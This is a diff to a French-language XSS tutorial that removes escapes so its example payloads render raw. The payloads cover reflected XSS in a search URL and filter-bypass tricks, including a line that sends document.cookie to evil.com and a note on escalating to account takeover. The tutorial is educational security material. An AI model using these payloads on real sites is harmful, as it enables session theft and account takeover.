@@ -27,7 +27,7 @@ La Reflected envoie le code malicieux au serveur, qui exécute le script et reto
 
 Exemple, si nous faisons une recherche dans un site pour un produit, et que dans l'url nous avons le résultat de notre recherche, alors nous pouvons tenter une XSS:
 
->*"\https://mon-url/products/search?q=\<script>alert(1)\</script>"
+>*"\https://mon-url/products/search?q=<script>alert(1)</script>"
 
 Si l'injection fonctionne, alors on l'envoie à un utilisateur et il déclenchera l'injection.
 
@@ -46,13 +46,13 @@ La self XSS est une XSS qui nécessite l'interaction utilisateur et donc, agit c
 ## Bypass de filtre
 
 Pour bypass les filtres:
-- essayer de fermer l'input :   '\<img src="**"/>\<script>alert(1)\</script>\</img>**'
+- essayer de fermer l'input :   '\<img src="**"/><script>alert(1)</script>\</img>**'
 - essayer d'utiliser directement des commandes js: '\<img src="**\javascript:alert(1)"**>\</img>'
 - essayer de jouer avec les fonctions d'appel js : '\<img src="**123" onerror="alert(1)"**>'
 - encoder avec le datafilter : "\data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"
-- Capitaliser : "\<scRiPT>location='\http://evil.com/c='+document.cookie;\</scRiPT>"
+- Capitaliser : "<scRiPT>location='\http://evil.com/c='+document.cookie;</scRiPT>"
 - Si quote et double quote filtrées, utiliser String.fromCharCode pour forger sa string
-- Contourner la logique des filtres : "\<scrip\<script>t>alert(1)\</scrip\</script>t>"
+- Contourner la logique des filtres : "<scrip<script>t>alert(1)</scrip</script>t>"
 ### Escalade de la vulnérabilité
 
 Avec les XSS, on peut évoluer sa criticité en passant d'une xss simple à un Account Takeover en volant par exemple les creds d'un admin.
